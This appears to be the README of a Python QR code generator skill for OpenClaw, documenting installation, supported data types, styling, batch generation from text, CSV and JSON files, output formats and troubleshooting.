# QR Code Generator

A powerful OpenClaw skill for creating customizable QR codes for any purpose.

## Features

✅ **Multiple Data Types**
- URLs and web links
- Plain text messages
- WiFi credentials
- Contact cards (vCard)
- Email addresses
- Phone numbers
- SMS messages
- GPS coordinates
- Calendar events

✅ **Customization**
- Custom colors (foreground/background)
- Logo embedding
- Error correction levels
- Adjustable size and border
- Multiple output formats

✅ **Export Formats**
- PNG (raster)
- SVG (vector)
- PDF (print-ready)
- EPS (design tools)
- Terminal (ASCII art)

✅ **Batch Processing**
- Generate from text files
- CSV with metadata
- JSON with full config
- Bulk URL/text lists

## Installation

### Prerequisites

1. Install [OpenClawCLI](https://clawhub.ai/) for Windows or MacOS

2. Install Python dependencies:

```bash
# Standard installation
pip install qrcode[pil] segno

# Or install from requirements.txt
pip install -r requirements.txt
```

**Using Virtual Environment (Recommended):**

```bash
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install -r requirements.txt
```

⚠️ **Never use `--break-system-packages`** - use virtual environments instead!

## Quick Start

### Basic Examples

```bash
# URL QR code
python scripts/qr.py "https://example.com"

# Text message
python scripts/qr.py --type text "Hello, World!"

# WiFi credentials
python scripts/qr.py --type wifi --ssid "MyNetwork" --password "secret123"

# Contact card
python scripts/qr.py --type vcard --name "John Doe" --phone "+1234567890" --email "john@example.com"
```

### Custom Styling

```bash
# Custom colors
python scripts/qr.py "https://example.com" --fg-color blue --bg-color white

# With company logo
python scripts/qr.py "https://company.com" --logo logo.png --error-correction H

# High quality for print
python scripts/qr.py "https://example.com" --box-size 15 --error-correction H --format pdf
```

## Common Use Cases

### 1. Restaurant Menu

```bash
python scripts/qr.py "https://restaurant.com/menu" \
  --output menu_qr.pdf \
  --format pdf \
  --box-size 15 \
  --error-correction H
```

### 2. WiFi Guest Access

```bash
python scripts/qr.py --type wifi \
  --ssid "Guest_Network" \
  --password "GuestPass123" \
  --format pdf \
  --output wifi_guest.pdf
```

### 3. Business Card

```bash
python scripts/qr.py --type vcard \
  --name "John Doe" \
  --phone "+1234567890" \
  --email "john@company.com" \
  --organization "Tech Corp" \
  --title "CEO" \
  --url "https://company.com" \
  --format svg \
  --output business_card.svg
```

### 4. Social Media Links

```bash
# Instagram
python scripts/qr.py "https://instagram.com/username" --output instagram_qr.png

# LinkedIn
python scripts/qr.py "https://linkedin.com/in/username" --output linkedin_qr.png

# Multiple platforms (batch)
cat > social.txt << EOF
https://twitter.com/username
https://instagram.com/username
https://linkedin.com/in/username
EOF

python scripts/qr.py --batch social.txt --output-dir social_qr/
```

### 5. Event Tickets

```bash
python scripts/qr.py --type text "TICKET-12345-VIP" \
  --output ticket.png \
  --box-size 12 \
  --error-correction H
```

### 6. Product Information

```bash
python scripts/qr.py "https://product.com/info/SKU12345" \
  --format svg \
  --fg-color "#000000" \
  --bg-color transparent \
  --output product_qr.svg
```

## Batch Generation

### From Text File

```bash
# Create list of URLs
cat > urls.txt << EOF
https://example.com
https://github.com
https://google.com
EOF

# Generate all QR codes
python scripts/qr.py --batch urls.txt --output-dir qrcodes/
```

### From CSV File

```bash
# Create CSV with metadata
cat > contacts.csv << EOF
name,phone,email,filename
John Doe,+1234567890,john@example.com,john_qr.png
Jane Smith,+0987654321,jane@example.com,jane_qr.png
EOF

# Generate vCard QR codes
python scripts/qr.py --batch contacts.csv --type vcard --output-dir contacts/
```

### From JSON File

```bash
# Create JSON config
cat > qr_config.json << EOF
[
  {
    "data": "https://example.com",
    "output": "example_qr.png",
    "fg_color": "blue",
    "bg_color": "white"
  },
  {
    "type": "wifi",
    "ssid": "MyNetwork",
    "password": "secret",
    "output": "wifi_qr.png"
  }
]
EOF

# Generate with custom config
python scripts/qr.py --batch qr_config.json --output-dir custom/
```

## QR Code Types

### URL/Link
```bash
python scripts/qr.py "https://example.com"
```

### Text
```bash
python scripts/qr.py --type text "Your message here"
```

### WiFi
```bash
python scripts/qr.py --type wifi \
  --ssid "NetworkName" \
  --password "password123" \
  --security WPA
```

### Contact (vCard)
```bash
python scripts/qr.py --type vcard \
  --name "John Doe" \
  --phone "+1234567890" \
  --email "john@example.com"
```

### Email
```bash
python scripts/qr.py --type email \
  --email "contact@example.com" \
  --subject "Hello" \
  --body "Message text"
```

### Phone
```bash
python scripts/qr.py --type phone --phone "+1234567890"
```

### SMS
```bash
python scripts/qr.py --type sms \
  --phone "+1234567890" \
  --message "Hello from QR!"
```

### Location
```bash
python scripts/qr.py --type geo \
  --latitude 37.7749 \
  --longitude -122.4194
```

### Calendar Event
```bash
python scripts/qr.py --type event \
  --event-title "Meeting" \
  --event-start "2024-03-15T14:00:00" \
  --event-end "2024-03-15T15:00:00" \
  --event-location "Conference Room A"
```

## Customization Options

### Colors

```bash
# Named colors
python scripts/qr.py "URL" --fg-color blue --bg-color white

# Hex colors
python scripts/qr.py "URL" --fg-color "#FF0000" --bg-color "#FFFFFF"

# RGB colors
python scripts/qr.py "URL" --fg-color "rgb(0,100,200)"

# Transparent background
python scripts/qr.py "URL" --bg-color transparent
```

### Error Correction

- **L** (Low) - 7% recovery - smallest size
- **M** (Medium) - 15% recovery - default
- **Q** (Quartile) - 25% recovery - good for logos
- **H** (High) - 30% recovery - best for print

```bash
python scripts/qr.py "URL" --error-correction H
```

### Size

```bash
# Larger modules
python scripts/qr.py "URL" --box-size 15

# Custom border
python scripts/qr.py "URL" --border 2

# No border
python scripts/qr.py "URL" --border 0
```

### Logo

```bash
# Add logo
python scripts/qr.py "URL" --logo company_logo.png

# Custom logo size (percentage)
python scripts/qr.py "URL" --logo logo.png --logo-size 25

# Logo with high error correction
python scripts/qr.py "URL" --logo logo.png --error-correction H
```

## Output Formats

### PNG (Default)
```bash
python scripts/qr.py "URL" --format png
```
Best for: Web, digital displays

### SVG (Vector)
```bash
python scripts/qr.py "URL" --format svg
```
Best for: Scalable graphics, any size

### PDF
```bash
python scripts/qr.py "URL" --format pdf
```
Best for: Printing, documents

### EPS
```bash
python scripts/qr.py "URL" --format eps
```
Best for: Professional design tools

### Terminal
```bash
python scripts/qr.py "URL" --format terminal
```
Best for: Quick preview in terminal

## Command Reference

```bash
python scripts/qr.py [DATA] [OPTIONS]

GENERAL:
  --type              Data type (url|text|wifi|vcard|email|phone|sms|geo|event)
  -o, --output        Output filename
  -f, --format        Format (png|svg|pdf|eps|terminal)

CUSTOMIZATION:
  --fg-color          Foreground color
  --bg-color          Background color
  --error-correction  Error level (L|M|Q|H)
  --box-size          Module size in pixels
  --border            Border size in modules
  --logo              Logo image path
  --logo-size         Logo size percentage

WIFI:
  --ssid              Network name
  --password          Network password
  --security          Security (WPA|WEP|nopass)
  --hidden            Hidden network flag

VCARD:
  --name              Full name
  --phone             Phone number
  --email             Email address
  --organization      Company
  --title             Job title
  --url               Website
  --address           Full address

BATCH:
  --batch             Input file (txt|csv|json)
  --output-dir        Output directory
```

## Best Practices

### Size and Scanning
- Minimum 2cm × 2cm for reliable scanning
- Keep 4 modules border (quiet zone)
- Test scan before mass production

### Error Correction
- Digital display: L or M
- Print without logo: M
- Print with logo: H
- Outdoor/damaged: H

### Colors
- High contrast (dark on light)
- Avoid similar tones
- Use black/white for print

### Logos
- Keep ≤ 30% of QR size
- Use error correction Q or H
- Test scanning with logo

## Troubleshooting

### "Cannot scan QR code"
- Increase error correction
- Ensure sufficient contrast
- Check minimum size (2cm)
- Reduce logo size
- Good lighting helps

### "Library not installed"
```bash
pip install qrcode[pil] segno
```

### "Logo obscures data"
- Use smaller logo (--logo-size 15)
- Increase error correction to H
- Test with simpler logo

### "Output file error"
- Check directory exists
- Verify write permissions
- Check available disk space

## Version

0.1.0 - Initial release

## License

Proprietary - See LICENSE.txt

## Credits

Built for OpenClaw using:
- [qrcode](https://pypi.org/project/qrcode/) - QR code generation
- [segno](https://pypi.org/project/segno/) - Advanced QR features
- [Pillow](https://python-pillow.org/) - Image processing